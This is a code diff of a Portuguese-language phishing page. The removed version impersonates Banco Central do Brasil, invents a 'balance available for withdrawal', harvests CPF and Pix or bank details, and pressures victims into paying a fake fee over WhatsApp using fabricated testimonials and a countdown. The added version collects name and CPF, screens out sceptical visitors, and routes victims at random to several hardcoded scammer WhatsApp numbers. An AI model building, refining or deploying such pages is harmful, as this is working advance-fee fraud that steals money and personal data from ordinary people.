@@ -2,537 +2,165 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Banco Central do Brasil - Consulta de Valores</title>
-    <!-- Tailwind CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        brand: {
-                            DEFAULT: '#0A31A6',
-                            dark: '#072175',
-                            light: '#1e4ad1'
-                        }
-                    }
-                }
-            }
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atendimento Exclusivo - Verificação de Cadastro</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-    </script>
-
-    <!-- Meta Pixel Code -->
-    <script>
-        !function(f,b,e,v,n,t,s)
-        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-        n.queue=[];t=b.createElement(e);t.async=!0;
-        t.src=v;s=b.getElementsByTagName(e)[0];
-        s.parentNode.insertBefore(t,s)}(window, document,'script',
-        'https://connect.facebook.net/en_US/fbevents.js');
-        fbq('init', '1305838618171369');
-        fbq('track', 'PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none"
-        src="https://www.facebook.com/tr?id=1305838618171369&ev=PageView&noscript=1"
-    /></noscript>
-    <!-- End Meta Pixel Code -->
+        .container {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            color: #444;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            text-align: left;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #555;
+        }
+        .checkbox-container input {
+            width: auto;
+            margin-right: 10px;
+            margin-top: 3px;
+        }
+        .btn-whatsapp {
+            background-color: #25d366;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            display: none; /* Começa oculto até o usuário confirmar os requisitos */
+        }
+        .btn-whatsapp:hover {
+            background-color: #1ebe5d;
+        }
+        .aviso-filtro {
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+        }
+    </style>
 </head>
-<body class="bg-slate-100 min-h-screen flex flex-col justify-between font-sans text-base antialiased" onload="carregarDepoimentosDinamicos()">
+<body>
 
-    <!-- Cabeçalho com Logo do Banco Central (Em Código Puro - Sem Erros) -->
-    <header class="bg-brand text-white shadow-md sticky top-0 z-50">
-        <div class="max-w-md mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center space-x-2.5">
-                <div class="bg-white text-brand font-black px-2.5 py-1.5 rounded-lg shadow-sm tracking-tighter text-sm flex items-center justify-center border border-blue-200">
-                    BCB
-                </div>
-                <div>
-                    <h1 class="font-bold text-sm leading-tight">Banco Central do Brasil</h1>
-                    <p class="text-[10px] text-blue-200">Atendimento ao Cidadão</p>
-                </div>
-            </div>
-            <div class="text-[11px] bg-blue-800 px-2.5 py-1 rounded-full border border-blue-600 font-medium">
-                🔒 Seguro
-            </div>
-        </div>
-    </header>
+    <div class="container">
+        <h2>Canal de Atendimento Prioritário</h2>
+        <p>Preencha os dados abaixo para verificar a liberação e prosseguir com o atendimento humanizado no WhatsApp.</p>
 
-    <!-- Conteúdo Principal Otimizado Mobile -->
-    <main class="max-w-md w-full mx-auto p-4 my-4 flex-grow">
-        
-        <!-- ETAPA 1: Consulta de CPF -->
-        <div id="step-1" class="bg-white rounded-2xl shadow-lg p-6 border border-slate-200">
-            <h2 class="text-xl font-extrabold text-slate-900 mb-2">Consulta de Valores Disponíveis</h2>
-            <p class="text-slate-600 text-sm mb-6 leading-relaxed">Digite seu CPF abaixo para verificar saldos ou créditos remanescentes vinculados ao seu registro institucional.</p>
-            
-            <div class="space-y-4">
-                <div>
-                    <label class="block text-sm font-bold text-slate-800 mb-1.5">Seu CPF:</label>
-                    <input type="tel" id="cpf-input" placeholder="000.000.000-00" maxlength="14" 
-                        class="w-full px-4 py-3.5 border-2 border-slate-300 rounded-xl focus:ring-2 focus:ring-brand focus:outline-none text-xl tracking-wider font-mono bg-slate-50"
-                        oninput="aplicarMascaraCPF(this)">
-                    <p id="cpf-error" class="text-red-600 text-xs mt-1.5 font-medium hidden">CPF inválido. Verifique os números digitados.</p>
-                </div>
-
-                <button id="btn-consultar" onclick="iniciarProcessamento()" disabled
-                    class="w-full bg-slate-200 text-slate-400 font-bold py-4 rounded-xl text-lg transition duration-200 cursor-not-allowed shadow-sm">
-                    Consultar Agora
-                </button>
-            </div>
+        <div class="form-group">
+            <label for="nome">Seu Nome Completo:</label>
+            <input type="text" id="nome" placeholder="Digite seu nome">
         </div>
 
-        <!-- ETAPA 2: Tela do Vídeo -->
-        <div id="step-video" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200 text-center">
-            <h3 class="text-lg font-bold text-slate-900 mb-1">Consultando valores no seu CPF...</h3>
-            <p class="text-slate-600 text-xs mb-4">Assista ao vídeo explicativo enquanto cruzamos suas informações nas bases oficiais:</p>
-            
-            <!-- Player do YouTube -->
-            <div class="relative w-full aspect-video rounded-xl overflow-hidden shadow-md mb-4 bg-black">
-                <iframe id="youtube-iframe" class="w-full h-full" src="" title="Vídeo Institucional" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-            </div>
-
-            <!-- Caixa de status -->
-            <div id="timer-box" class="bg-blue-50 border border-blue-200 rounded-xl p-3 mb-4 text-blue-900 text-xs font-semibold flex items-center justify-center space-x-2">
-                <div class="inline-block animate-spin rounded-full h-3.5 w-3.5 border-2 border-brand border-t-transparent"></div>
-                <span>Buscando registros e valores a receber...</span>
-            </div>
-
-            <button id="btn-ver-resultado" onclick="mostrarPrimeiroExtrato()" disabled
-                class="w-full bg-slate-200 text-slate-400 font-bold py-3.5 rounded-xl text-base transition duration-200 cursor-not-allowed shadow-sm">
-                Aguarde a consulta...
-            </button>
+        <div class="form-group">
+            <label for="cpf">Seu CPF (Apenas para consulta):</label>
+            <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
         </div>
 
-        <!-- ETAPA 3: Primeiro Extrato -->
-        <div id="step-extrato-1" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200 text-center">
-            <div class="bg-slate-900 text-white rounded-xl p-4 mb-5 border-2 border-blue-500 shadow-inner relative overflow-hidden text-left">
-                <div class="absolute top-0 right-0 bg-blue-600 text-[10px] px-2.5 py-0.5 rounded-bl-lg font-mono tracking-widest">SISTEMA v4.2</div>
-                <p class="text-[11px] text-blue-300 font-mono mb-1">EXTRATO DE ATIVOS</p>
-                <div class="border-b border-slate-700 pb-2.5 mb-2.5">
-                    <p class="text-[11px] text-slate-400">CPF: <span id="print-cpf-1" class="text-white font-mono font-bold"></span></p>
-                    <p class="text-[11px] text-slate-400">STATUS: <span class="text-emerald-400 font-bold">DISPONÍVEL PARA SAQUE</span></p>
-                </div>
-                <div class="text-center py-1">
-                    <p class="text-[11px] text-slate-300 uppercase tracking-wider mb-0.5">Valor Localizado:</p>
-                    <h3 class="text-3xl font-black text-emerald-400 font-mono tracking-tight" id="valor-encontrado-1">R$ 0,00</h3>
-                </div>
-            </div>
-
-            <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 mb-5 text-xs text-slate-700 space-y-1.5 text-left leading-relaxed">
-                <p class="font-bold text-slate-900">📋 Informação do Saldo:</p>
-                <p>• Valores remanescentes de tarifas bancárias e cobranças indevidas regularizadas.</p>
-            </div>
-
-            <button onclick="irParaFormularioConta()" 
-                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-extrabold py-4 rounded-xl transition duration-200 shadow-lg text-lg">
-                💰 Sacar Agora
-            </button>
+        <!-- Filtro de Intenção / Barreira para curiosos -->
+        <div class="checkbox-container">
+            <input type="checkbox" id="concordo" onchange="validarFormulario()">
+            <label for="concordo" style="font-weight: normal; cursor: pointer;">
+                Estou ciente de que o atendimento requer o cumprimento dos procedimentos de emissão e possuo disponibilidade para finalizar o processo hoje.
+            </label>
         </div>
 
-        <!-- TELA DE CARREGAMENTO GENÉRICA -->
-        <div id="loading-screen" class="hidden bg-white rounded-2xl shadow-lg p-8 text-center border border-slate-200">
-            <div class="inline-block animate-spin rounded-full h-12 w-12 border-4 border-brand border-t-transparent mb-4"></div>
-            <h3 id="loading-text" class="text-base font-bold text-slate-900">Processando...</h3>
-            <p class="text-xs text-slate-500 mt-1">Aguarde um instante.</p>
+        <button id="btnIr" class="btn-whatsapp" onclick="enviarParaWhatsApp()">Falar com Atendente no WhatsApp</button>
+
+        <div class="aviso-filtro">
+            🔒 Ambiente seguro. Apenas cliques qualificados serão direcionados.
         </div>
+    </div>
 
-        <!-- TELA DE CARREGAMENTO DE TRANSFERÊNCIA -->
-        <div id="loading-transferencia" class="hidden bg-white rounded-2xl shadow-lg p-8 text-center border border-slate-200">
-            <div class="inline-block animate-spin rounded-full h-14 w-14 border-4 border-brand border-t-transparent mb-4"></div>
-            <h3 class="text-lg font-extrabold text-slate-900 mb-2">Transferindo para a sua conta bancária...</h3>
-            <p class="text-xs text-slate-600 mb-4 leading-relaxed">Estabelecendo conexão segura com o SFN e emitindo ordem de repasse...</p>
-            <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 text-brand text-xs font-semibold flex items-center justify-center space-x-2">
-                <div class="inline-block animate-spin rounded-full h-3 w-3 border-2 border-brand border-t-transparent"></div>
-                <span>Processando repasse institucional em andamento...</span>
-            </div>
-        </div>
-
-        <!-- ETAPA 4: Coleta de Chave Pix ou Conta Bancária -->
-        <div id="step-conta" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200">
-            <h3 class="text-lg font-extrabold text-slate-900 mb-2">Dados para Recebimento</h3>
-            <p class="text-slate-600 text-xs mb-5 leading-relaxed">Informe sua Chave Pix ou o número da Conta Bancária para receber o depósito:</p>
-            
-            <div class="space-y-4">
-                <div>
-                    <label class="block text-xs font-bold text-slate-800 mb-1.5">Chave Pix ou número da conta:</label>
-                    <input type="text" id="conta-input" placeholder="Chave Pix ou número da conta" 
-                        class="w-full px-4 py-3.5 border-2 border-slate-300 rounded-xl focus:ring-2 focus:ring-brand focus:outline-none text-sm bg-slate-50 font-medium"
-                        oninput="validarDadosConta(this)">
-                    <p id="conta-error" class="text-red-600 text-xs mt-1 font-medium hidden">Digite uma chave ou conta válida (mínimo de 5 caracteres).</p>
-                </div>
-
-                <button id="btn-pre-sacar" onclick="processarSegundoExtrato()" disabled
-                    class="w-full bg-slate-200 text-slate-400 font-bold py-4 rounded-xl text-base transition duration-200 cursor-not-allowed shadow-sm">
-                    Prosseguir para o Saque
-                </button>
-            </div>
-        </div>
-
-        <!-- ETAPA 5: Segundo Extrato -->
-        <div id="step-extrato-2" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200 text-center">
-            <div class="bg-slate-900 text-white rounded-xl p-4 mb-5 border-2 border-emerald-500 shadow-inner relative overflow-hidden text-left">
-                <div class="absolute top-0 right-0 bg-emerald-600 text-[10px] px-2.5 py-0.5 rounded-bl-lg font-mono tracking-widest">REPASSE</div>
-                <p class="text-[11px] text-emerald-300 font-mono mb-1">COMPROVANTE DE VINCULAÇÃO</p>
-                <div class="border-b border-slate-700 pb-2.5 mb-2.5 space-y-1">
-                    <p class="text-[11px] text-slate-400">CPF TITULAR: <span id="print-cpf-2" class="text-white font-mono font-bold"></span></p>
-                    <p class="text-[11px] text-slate-400">DESTINO: <span id="print-conta-2" class="text-emerald-400 font-mono font-bold"></span></p>
-                </div>
-                <div class="text-center py-1">
-                    <p class="text-[11px] text-slate-300 uppercase tracking-wider mb-0.5">Valor a Depositar:</p>
-                    <h3 class="text-3xl font-black text-emerald-400 font-mono tracking-tight" id="valor-encontrado-2">R$ 0,00</h3>
-                </div>
-            </div>
-
-            <button onclick="iniciarTransferencia()" 
-                class="w-full bg-brand hover:bg-brand-dark text-white font-extrabold py-4 rounded-xl transition duration-200 shadow-lg text-lg">
-                🔒 Confirmar Saque
-            </button>
-        </div>
-
-        <!-- ETAPA 6: Transação Bloqueada / Taxa com Resumo Final, Justificativa Detalhada, Urgência e Depoimentos -->
-        <div id="step-taxa" class="hidden bg-white rounded-2xl shadow-lg p-6 border border-slate-200">
-            
-            <!-- Cronômetro de Urgência no Topo -->
-            <div class="bg-red-50 border border-red-200 rounded-xl p-2.5 mb-4 text-center text-red-700 text-xs font-bold flex items-center justify-center space-x-1.5 shadow-sm">
-                <span>⏰ Sua ordem expira em:</span>
-                <span id="timer-expiracao" class="font-mono text-sm font-black bg-red-600 text-white px-2 py-0.5 rounded">09:59</span>
-            </div>
-
-            <!-- CARTÃO EXTRATO FINAL DE RESUMO -->
-            <div class="bg-slate-900 text-white rounded-xl p-4 mb-4 border-2 border-amber-500 shadow-inner relative overflow-hidden text-left">
-                <div class="absolute top-0 right-0 bg-amber-600 text-[10px] px-2.5 py-0.5 rounded-bl-lg font-mono tracking-widest text-white">PENDENTE</div>
-                <p class="text-[11px] text-amber-300 font-mono mb-1">RESUMO DA ORDEM DE SAQUE</p>
-                <div class="border-b border-slate-700 pb-2.5 mb-2.5 space-y-1">
-                    <p class="text-[11px] text-slate-400">CPF: <span id="print-cpf-3" class="text-white font-mono font-bold"></span></p>
-                    <p class="text-[11px] text-slate-400">DESTINO: <span id="print-conta-3" class="text-amber-400 font-mono font-bold"></span></p>
-                    <p class="text-[11px] text-slate-400">STATUS: <span class="text-amber-400 font-bold">AGUARDANDO EMISSÃO</span></p>
-                </div>
-                <div class="text-center py-1">
-                    <p class="text-[11px] text-slate-300 uppercase tracking-wider mb-0.5">Valor a Receber:</p>
-                    <h3 class="text-2xl font-black text-emerald-400 font-mono tracking-tight" id="valor-encontrado-3">R$ 0,00</h3>
-                </div>
-            </div>
-
-            <div class="bg-amber-50 border-2 border-amber-300 rounded-xl p-3 mb-4 text-center shadow-sm">
-                <div class="text-amber-800 font-black text-sm mb-0.5">⚠️ Falta Apenas 1 Passo para o Depósito!</div>
-                <p class="text-amber-900 text-[11px] font-semibold">Regularização da Taxa Operacional de Emissão</p>
-            </div>
-            
-            <!-- POR QUE É NECESSÁRIO PAGAR ESTA TAXA? -->
-            <div class="bg-slate-50 border border-slate-200 rounded-xl p-3.5 mb-4 text-xs text-slate-700 space-y-2 text-left leading-relaxed">
-                <p class="font-black text-slate-900 border-b border-slate-200 pb-1 flex items-center justify-between">
-                    <span>📌 Por que existe esta taxa?</span>
-                    <span class="text-[10px] text-brand bg-blue-50 px-2 py-0.5 rounded border border-blue-200">Normativa SFN</span>
-                </p>
-                <p>• <strong>Emissão de Ordem de Repasse (TED/Pix):</strong> Conforme as diretrizes operacionais do Sistema Financeiro Nacional, a emissão e validação do documento de transferência interbancária exige o selo digital de autenticidade.</p>
-                <p>• <strong>Segurança contra fraudes:</strong> A taxa serve como validação de identidade em camada dupla, garantindo que o valor integral de <span id="valor-badge-detalhe" class="font-mono font-bold text-slate-900">R$ 0,00</span> seja direcionado exclusivamente para a sua conta informada, impedindo desvios.</p>
-            </div>
-
-            <!-- Vantagem / Ancoragem -->
-            <div class="bg-emerald-50 border-2 border-emerald-300 p-3 rounded-xl text-emerald-900 text-center shadow-inner mb-5">
-                <p class="text-[11px] font-bold text-emerald-800 uppercase tracking-wide">💡 Vantagem do Resgate</p>
-                <p class="text-xs mt-1">A taxa de liberação de <strong class="text-emerald-700 font-bold">R$ 59,80</strong> representa <strong>menos de 1%</strong> do valor total de <span id="valor-badge-taxa" class="font-mono font-bold text-emerald-700">R$ 0,00</span> que você vai resgatar!</p>
-            </div>
-
-            <!-- Botão Pagar no WhatsApp -->
-            <a id="btn-whatsapp" href="#" onclick="clicarWhatsApp(event)" target="_blank"
-                class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-black py-4 rounded-xl transition duration-200 shadow-xl text-base flex items-center justify-center space-x-2 mb-5 cursor-pointer animate-pulse text-center no-underline">
-                <span>💬 Pagar Taxa no WhatsApp</span>
-            </a>
-
-            <!-- 4 Provas Sociais Dinâmicas e Rotativas -->
-            <div class="border-t border-slate-200 pt-4">
-                <h4 class="text-center font-bold text-slate-900 text-xs mb-3">⭐ Pessoas que pagaram e receberam hoje:</h4>
-                
-                <div id="container-depoimentos" class="space-y-2.5">
-                    <!-- Preenchido via JavaScript dinamicamente -->
-                </div>
-            </div>
-
-            <p class="text-center text-[10px] text-slate-400 mt-4">Ambiente criptografado sob os padrões do SFN.</p>
-        </div>
-
-    </main>
-
-    <!-- Rodapé -->
-    <footer class="text-center py-4 text-[10px] text-slate-500 max-w-md mx-auto px-4">
-        <p>&copy; 2026 Banco Central do Brasil. Todos os direitos reservados.</p>
-    </footer>
-
-    <!-- LÓGICA EM JAVASCRIPT -->
     <script>
-        // Função auxiliar para subir o scroll para o topo suavemente
-        function subirParaTopo() {
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        // NOVO NÚMERO DO WHATSAPP CONFIGURADO
-        const listaWhatsapps = [
-            "5516982192895" //WP6
-
+        // Lista com todos os números de WhatsApp cadastrados (com DDI 55 e DDD)
+        const listaNumeros = [
+            "5516982516678",
+            "5516982192895",
+            "5516982195327",
+            "5511948594495",
+            "5516976000397"
         ];
 
-        function obterNumeroRotaqao() {
-            let cliques = localStorage.getItem('contador_cli_zap') || 0;
-            cliques = parseInt(cliques) + 1;
-            localStorage.setItem('contador_cli_zap', cliques);
-            let indice = Math.floor((cliques - 1) / 10) % listaWhatsapps.length;
-            return listaWhatsapps[indice];
-        }
+        function validarFormulario() {
+            const nome = document.getElementById('nome').value.trim();
+            const cpf = document.getElementById('cpf').value.trim();
+            const concordo = document.getElementById('concordo').checked;
+            const btn = document.getElementById('btnIr');
 
-        let cpfGlobal = "";
-        let valorGlobal = "";
-        let contaGlobal = "";
-
-        const bancoDepoimentos = [
-            { nome: "Maria S.", cidade: "São Paulo - SP", valor: "R$ 7.420", texto: "Paguei os 59,80 pelo WhatsApp e em 10 minutos o dinheiro caiu na minha conta. Recomendo muito!" },
-            { nome: "João Silva", cidade: "Belo Horizonte - MG", valor: "R$ 9.150", texto: "Atendimento super rápido. Paguei a taxa e o Pix caiu direto na minha conta corrente." },
-            { nome: "Ana Paula M.", cidade: "Curitiba - PR", valor: "R$ 6.300", texto: "No começo fiquei receosa, mas o suporte no WhatsApp explicou tudo direitinho. Deu super certo!" },
-            { nome: "Carlos Eduardo", cidade: "Rio de Janeiro - RJ", valor: "R$ 8.900", texto: "Recebi o aviso, fiz o procedimento e já está na conta. Excelente serviço do Banco Central." },
-            { nome: "Francisca Lima", cidade: "Fortaleza - CE", valor: "R$ 5.840", texto: "Dinheiro na conta em poucos minutos depois que falei com o atendente no WhatsApp. Muito feliz!" },
-            { nome: "José Roberto", cidade: "Porto Alegre - RS", valor: "R$ 11.200", texto: "Surpreendente! Pensei que era golpe, mas consultei meu CPF e resgatei tudo certinho." },
-            { nome: "Lucia Helena", cidade: "Salvador - BA", valor: "R$ 6.750", texto: "Atendimento humano e nota 10 no WhatsApp. Já indiquei para toda a minha família." },
-            { nome: "Antônio Carlos", cidade: "Goiânia - GO", valor: "R$ 8.150", texto: "Processo rápido, descompliquei em minutos. Taxa paga e Pix recebido com sucesso." }
-        ];
-
-        function carregarDepoimentosDinamicos() {
-            let embaralhados = [...bancoDepoimentos].sort(() => 0.5 - Math.random());
-            let selecionados = embaralhados.slice(0, 4);
-
-            let container = document.getElementById('container-depoimentos');
-            container.innerHTML = "";
-
-            selecionados.forEach(dep => {
-                let partesNome = dep.nome.split(' ');
-                let iniciais = partesNome[0][0] + (partesNome[1] ? partesNome[1][0] : '');
-
-                let htmlCard = `
-                    <div class="bg-slate-50 border border-slate-200 rounded-xl p-3 text-xs flex items-start space-x-2.5">
-                        <div class="bg-brand text-white font-bold rounded-full w-7 h-7 flex items-center justify-center flex-shrink-0 text-xs">${iniciais}</div>
-                        <div>
-                            <div class="flex items-center justify-between">
-                                <span class="font-bold text-slate-900 text-[11px]">${dep.nome} (${dep.cidade})</span>
-                                <span class="text-emerald-600 font-bold text-[10px]">✓ Recebeu ${dep.valor}</span>
-                            </div>
-                            <p class="text-slate-600 text-[11px] mt-0.5 leading-tight">"${dep.texto}"</p>
-                        </div>
-                    </div>
-                `;
-                container.innerHTML += htmlCard;
-            });
-        }
-
-        function aplicarMascaraCPF(input) {
-            let v = input.value.replace(/\D/g, '');
-            if (v.length > 11) v = v.slice(0, 11);
-            
-            if (v.length > 9) {
-                v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-            } else if (v.length > 6) {
-                v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
-            } else if (v.length > 3) {
-                v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
-            }
-            input.value = v;
-
-            let cpfLimpo = v.replace(/\D/g, '');
-            let btn = document.getElementById('btn-consultar');
-            let err = document.getElementById('cpf-error');
-
-            if (validarCPF(cpfLimpo)) {
-                btn.disabled = false;
-                btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                btn.classList.add('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                err.classList.add('hidden');
+            if (nome.length > 2 && cpf.length >= 11 && concordo) {
+                btn.style.display = 'block';
             } else {
-                btn.disabled = true;
-                btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                btn.classList.remove('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                if(cpfLimpo.length === 11) {
-                    err.classList.remove('hidden');
-                } else {
-                    err.classList.add('hidden');
-                }
+                btn.style.display = 'none';
             }
         }
 
-        function validarCPF(strCPF) {
-            if (strCPF.length !== 11) return false;
-            if (/^(\d)\1+$/.test(strCPF)) return false;
-            let Soma = 0, Resto;
-            for (let i=1; i<=9; i++) Soma += parseInt(strCPF.substring(i-1, i)) * (11 - i);
-            Resto = (Soma * 10) % 11;
-            if ((Resto === 10) || (Resto === 11)) Resto = 0;
-            if (Resto !== parseInt(strCPF.substring(9, 10))) return false;
-            Soma = 0;
-            for (let i = 1; i <= 10; i++) Soma += parseInt(strCPF.substring(i-1, i)) * (12 - i);
-            Resto = (Soma * 10) % 11;
-            if ((Resto === 10) || (Resto === 11)) Resto = 0;
-            if (Resto !== parseInt(strCPF.substring(10, 11))) return false;
-            return true;
-        }
+        document.getElementById('nome').addEventListener('input', validarFormulario);
+        document.getElementById('cpf').addEventListener('input', validarFormulario);
 
-        function iniciarProcessamento() {
-            cpfGlobal = document.getElementById('cpf-input').value;
-            let cpfLimpo = cpfGlobal.replace(/\D/g, '');
-
-            let chaveMemoria = 'saldo_cpf_' + cpfLimpo;
-            let valorSalvo = localStorage.getItem(chaveMemoria);
-
-            if (!valorSalvo) {
-                let valorAleatorio = Math.random() * (10000 - 5000) + 5000;
-                valorSalvo = valorAleatorio.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
-                localStorage.setItem(chaveMemoria, valorSalvo);
-            }
-            valorGlobal = valorSalvo;
-
-            document.getElementById('step-1').classList.add('hidden');
+        function enviarParaWhatsApp() {
+            const nome = document.getElementById('nome').value;
+            const cpf = document.getElementById('cpf').value;
             
-            let iframe = document.getElementById('youtube-iframe');
-            iframe.src = "https://www.youtube.com/embed/saO1_TtC9mI?autoplay=1&mute=0&enablejsapi=1";
-
-            document.getElementById('step-video').classList.remove('hidden');
-            subirParaTopo();
-            iniciarContadorVideo();
-        }
-
-        let segundosRestantes = 45;
-        function iniciarContadorVideo() {
-            let timerBox = document.getElementById('timer-box');
-            let btnResultado = document.getElementById('btn-ver-resultado');
-
-            let intervalo = setInterval(() => {
-                segundosRestantes--;
-
-                if (segundosRestantes <= 0) {
-                    clearInterval(intervalo);
-                    timerBox.classList.remove('bg-blue-50', 'border-blue-200', 'text-blue-900');
-                    timerBox.classList.add('bg-emerald-50', 'border-emerald-200', 'text-emerald-800');
-                    timerBox.innerHTML = "✅ Consulta e cruzamento de dados concluídos!";
-                    
-                    btnResultado.disabled = false;
-                    btnResultado.innerText = "Mostrar Resultado";
-                    btnResultado.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                    btnResultado.classList.add('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                }
-            }, 1000);
-        }
-
-        function mostrarPrimeiroExtrato() {
-            document.getElementById('step-video').classList.add('hidden');
-            document.getElementById('print-cpf-1').innerText = cpfGlobal;
-            document.getElementById('valor-encontrado-1').innerText = valorGlobal;
-            document.getElementById('step-extrato-1').classList.remove('hidden');
-            subirParaTopo();
-        }
-
-        function irParaFormularioConta() {
-            document.getElementById('step-extrato-1').classList.add('hidden');
-            document.getElementById('loading-text').innerText = "Carregando ambiente seguro de repasse...";
-            document.getElementById('loading-screen').classList.remove('hidden');
-            subirParaTopo();
-
-            setTimeout(() => {
-                document.getElementById('loading-screen').classList.add('hidden');
-                document.getElementById('step-conta').classList.remove('hidden');
-                subirParaTopo();
-            }, 3000);
-        }
-
-        function validarDadosConta(input) {
-            contaGlobal = input.value.trim();
-            let btn = document.getElementById('btn-pre-sacar');
-            let err = document.getElementById('conta-error');
-
-            if (contaGlobal.length >= 5) {
-                btn.disabled = false;
-                btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                btn.classList.add('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                err.classList.add('hidden');
-            } else {
-                btn.disabled = true;
-                btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                btn.classList.remove('bg-brand', 'hover:bg-brand-dark', 'text-white', 'cursor-pointer', 'shadow-md');
-                if(contaGlobal.length > 0) {
-                    err.classList.remove('hidden');
-                } else {
-                    err.classList.add('hidden');
-                }
-            }
-        }
-
-        function processarSegundoExtrato() {
-            document.getElementById('step-conta').classList.add('hidden');
-            document.getElementById('loading-text').innerText = "Vinculando dados bancários ao CPF...";
-            document.getElementById('loading-screen').classList.remove('hidden');
-            subirParaTopo();
-
-            setTimeout(() => {
-                document.getElementById('loading-screen').classList.add('hidden');
-                document.getElementById('print-cpf-2').innerText = cpfGlobal;
-                document.getElementById('print-conta-2').innerText = contaGlobal;
-                document.getElementById('valor-encontrado-2').innerText = valorGlobal;
-                document.getElementById('step-extrato-2').classList.remove('hidden');
-                subirParaTopo();
-            }, 3000);
-        }
-
-        function iniciarTransferencia() {
-            document.getElementById('step-extrato-2').classList.add('hidden');
-            document.getElementById('loading-transferencia').classList.remove('hidden');
-            subirParaTopo();
-
-            setTimeout(() => {
-                document.getElementById('loading-transferencia').classList.add('hidden');
-                
-                document.getElementById('print-cpf-3').innerText = cpfGlobal;
-                document.getElementById('print-conta-3').innerText = contaGlobal;
-                document.getElementById('valor-encontrado-3').innerText = valorGlobal;
-                document.getElementById('valor-badge-taxa').innerText = valorGlobal;
-                document.getElementById('valor-badge-detalhe').innerText = valorGlobal;
-
-                document.getElementById('step-taxa').classList.remove('hidden');
-                subirParaTopo();
-                iniciarCronometroTaxa();
-            }, 15000);
-        }
-
-        function iniciarCronometroTaxa() {
-            let tempoTotal = 600;
-            let display = document.getElementById('timer-expiracao');
-
-            let timerInterval = setInterval(() => {
-                let minutos = Math.floor(tempoTotal / 60);
-                let segundos = tempoTotal % 60;
-
-                minutos = minutos < 10 ? "0" + minutos : minutos;
-                segundos = segundos < 10 ? "0" + segundos : segundos;
-
-                display.innerText = minutos + ":" + segundos;
-
-                if (--tempoTotal < 0) {
-                    clearInterval(timerInterval);
-                    display.innerText = "00:00";
-                }
-            }, 1000);
-        }
-
-        function clicarWhatsApp(event) {
-            // Dispara o evento de Purchase no Pixel do Facebook
-            if (typeof fbq === 'function') {
-                fbq('track', 'Purchase');
-            }
-
-            let numeroEscolhido = obterNumeroRotaqao();
-            let textoMensagem = `Oi quero pagar a taxa de emissao. Meu CPF é ${cpfGlobal} e tenho o valor de ${valorGlobal} disponível para saque.`;
-            let mensagemCodificada = encodeURIComponent(textoMensagem);
-
-            let linkZap = `https://wa.me/${numeroEscolhido}?text=${mensagemCodificada}`;
-            event.currentTarget.href = linkZap;
+            // Escolhe de forma aleatória um número da lista acima a cada clique
+            const numeroAleatorio = listaNumeros[Math.floor(Math.random() * listaNumeros.length)];
+            
+            const mensagem = `Olá, meu nome é *${nome}* (CPF: ${cpf}). Já preenchi os dados no site e tenho disponibilidade para prosseguir com o atendimento.`;
+            
+            const url = `https://api.whatsapp.com/send?phone=${numeroAleatorio}&text=${encodeURIComponent(mensagem)}`;
+            
+            window.location.href = url;
         }
     </script>
+
 </body>
 </html>
